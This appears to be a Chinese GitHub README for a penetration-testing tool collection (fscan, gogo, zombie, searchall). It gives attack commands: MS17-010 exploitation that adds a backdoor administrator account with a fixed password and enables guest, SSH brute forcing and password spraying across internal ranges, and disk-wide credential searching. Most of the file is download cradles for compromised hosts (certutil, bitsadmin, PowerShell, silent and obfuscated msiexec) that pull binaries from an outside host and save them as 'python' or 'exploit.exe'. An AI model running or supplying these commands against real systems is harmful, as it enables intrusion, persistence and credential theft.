# heixiongT00ls
收集渗透中会用到的常用工具，快速下载 。
fscan
searchall
zombie
gogo
建议直接[Ctrl+F]查找
![image](https://github.com/user-attachments/assets/3988c3e7-42d9-41c4-aa01-d2cc76360bf4)
![image](https://github.com/user-attachments/assets/cf7b6622-0c2e-4489-be2f-bee097963a20)


## fscan
常用命令
```
fscan -h x.x.x.x -m ms17010 -sc add 
fscan -h x.x.x.x -m ms17010 -sc guest
sysadmin/1qaz@WSX!@#4
guest/1qaz@WSX!@#4
./fscan -h 192.168.0.0/16 -userf user -pwdf pwd -m ssh -p 22
```

Linux amd
```
64
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan -O python

32
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32 -O python
```


Linux arm
```
64
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64 -O python

32
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6 -O python
```


Windows 
```
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe

32
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe
```


Windows arm

```
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe

32
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe
```

Windows 2003

```
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe

upx
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe
```

## gogo
常用命令
```
gogo -w ss -i 172.16.0.0/12 -ev
gogo -w s -i 192.168.0.0/16 -ev
gogo -w 10 -ev
./gogo -F .192.168.0.0.16_all_s_jl.dat
```

Linux amd

```
64
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_amd64 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_amd64 -O python

32
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_386 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_386 -O python
```


Linux arm

```
64
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_arm64 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_arm64 -O python

32
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_arm -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_arm -O python
```


Windows amd

```
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe

32
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe
```


Windows arm
```
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe

32
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe
```

## zombie
zombie常用命令
```
./zombie_linux_amd64 --gogo .192.168.0.0.16_all_s_jl.dat -P top100.txt 
```

Linux amd

```
64
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_linux_amd64 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_linux_amd64 -O python

32
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_linux_386 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_linux_386 -O python
```


Linux arm

```
64
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_linux_arm64 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_linux_arm64 -O python

32
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_linux_arm -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_linux_arm -O python
```

Windows amd
```
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe

32
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe
```

Windows7 amd
```
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe

32
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe
```


Windows arm
```
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe

32
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe
```

## searchall
searchall常用命令
```
./searchall64 search -p /
searchall64.exe search -p C:/
```

Linux amd
```
64
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64 -O python

32
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32 -O python
```


Windows
```
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe

32
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe, exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe
```
